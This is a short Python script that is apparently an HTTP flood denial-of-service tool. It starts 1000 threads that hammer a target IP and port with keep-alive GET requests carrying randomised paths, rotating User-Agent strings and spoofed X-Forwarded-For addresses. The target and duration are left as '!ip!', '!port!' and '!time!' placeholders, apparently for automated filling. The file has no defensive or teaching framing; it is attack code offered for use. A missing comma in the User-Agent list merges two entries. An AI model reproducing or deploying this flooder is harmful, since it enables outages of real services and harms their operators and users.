import socket, threading, time, random

__THREAD_NUMBER__ = 1000

user_agent = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3'
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
]

def get_addr():
    p1, p2, p3, p4 = random.randrange(0, 255, 1), random.randrange(0, 255, 1), random.randrange(0, 255, 1), random.randrange(0, 255, 1)
    return f'{p1}.{p2}.{p3}.{p4}'

def http_flood(ip: str, port: str, timeout: str):
    def flood(ip: str, port: int, timeout: int):
        start_time = int(time.time())

        while int(time.time()) - start_time < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                
                for _ in range(50):
                    sock.send(f'GET /{random.randint(0, 9999)} HTTP/1.1\r\nConnection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\nUser-Agent: {random.choice(user_agent)}\r\nX-Forwarded-For: {get_addr()}\r\nAccept: */*\r\n'.encode())
                
                sock.shutdown(1)
            except:
                pass

    for _ in range(__THREAD_NUMBER__):
        threading.Thread(target= flood, args=(ip, int(port), int(timeout),)).start()

http_flood('!ip!', '!port!', '!time!')